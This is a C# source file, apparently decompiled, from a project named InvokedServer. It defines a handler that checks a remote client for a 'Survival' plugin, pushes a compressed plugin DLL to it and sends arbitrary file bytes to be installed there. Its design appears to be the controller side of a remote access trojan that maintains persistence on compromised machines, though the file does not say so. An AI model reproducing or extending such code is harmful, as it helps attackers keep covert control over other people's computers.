

using InvokedCommon.Messages;
using InvokedCommon.Networking;
using InvokedServer.Enums;
using InvokedServer.Helper;
using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;


namespace InvokedServer.Messages
{
	public class ResetSurvivalHandler : MessageProcessorBase<object>, IDisposable
	{
		private string _pluginPath = "Plugins\\PluginSurvival.dll";
		private string _pluginName = "Survival";
		private readonly InvokedServer.Networking.Client _client;
		private readonly object _syncLock = new object();
		private byte[] _filebytes;
		private string _filextension;

		public event ResetSurvivalHandler.PluginStatusEventHandler PluginStatusChanged;

		private void OnPluginStatusChanged(PluginStatus value)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				ResetSurvivalHandler.PluginStatusEventHandler pluginStatusChanged = this.PluginStatusChanged;
				if (pluginStatusChanged == null)
					return;
				pluginStatusChanged((object)this, (PluginStatus)val);
			}), (object)value);
		}

		public event ResetSurvivalHandler.LogHandler NewLogHandler;

		private void OnNewLog(string text)
		{
			this.SynchronizationContext.Post((SendOrPostCallback)(val =>
			{
				ResetSurvivalHandler.LogHandler newLogHandler = this.NewLogHandler;
				if (newLogHandler == null)
					return;
				newLogHandler((object)this, (string)val);
			}), (object)text);
		}

		public ResetSurvivalHandler(InvokedServer.Networking.Client client)
		  : base(true)
		{
			this._client = client;
		}

		public override bool CanExecute(IMessage message)
		{
			return message is CheckPluginResponse || message is NewSurvivalLog;
		}

		public override bool CanExecuteFrom(ISender sender) => this._client.Equals((object)sender);

		public override void Execute(ISender sender, IMessage message)
		{
			switch (message)
			{
				case CheckPluginResponse message1:
					this.Execute(sender, message1);
					break;
				case NewSurvivalLog message2:
					this.Execute(sender, message2);
					break;
			}
		}

		private void Execute(ISender client, NewSurvivalLog message) => this.OnNewLog(message.log);

		public void CheckPluginStatus()
		{
			lock (this._syncLock)
				this._client.Send<CheckPlugin>(new CheckPlugin()
				{
					PluginName = this._pluginName
				});
		}

		public void InstallResetSurvival(byte[] FileBytes, string extension)
		{
			this._filebytes = FileBytes;
			this._filextension = extension;
			this._client.Send<DoSurvivialInstall>(new DoSurvivialInstall()
			{
				filebytes = FileBytes,
				filextension = extension
			});
		}

		private void Execute(ISender client, CheckPluginResponse message)
		{
			if (message.PluginName != this._pluginName)
			{
				int num = (int)MessageBox.Show(message.PluginName);
			}
			else if (message.Status)
			{
				this.OnPluginStatusChanged(PluginStatus.Loaded);
			}
			else
			{
				this.OnPluginStatusChanged(PluginStatus.Installing);
				if (File.Exists(this._pluginPath))
				{
					lock (this._syncLock)
						this._client.Send<DoPlugin>(new DoPlugin()
						{
							PluginName = this._pluginName,
							Data = Zip.Compress(File.ReadAllBytes(this._pluginPath))
						});
				}
				else
					this.OnPluginStatusChanged(PluginStatus.PluginFileNotFound);
			}
		}

		public void Dispose() => GC.SuppressFinalize((object)this);

		public delegate void PluginStatusEventHandler(object sender, PluginStatus value);

		public delegate void LogHandler(object sender, string log);
	}
}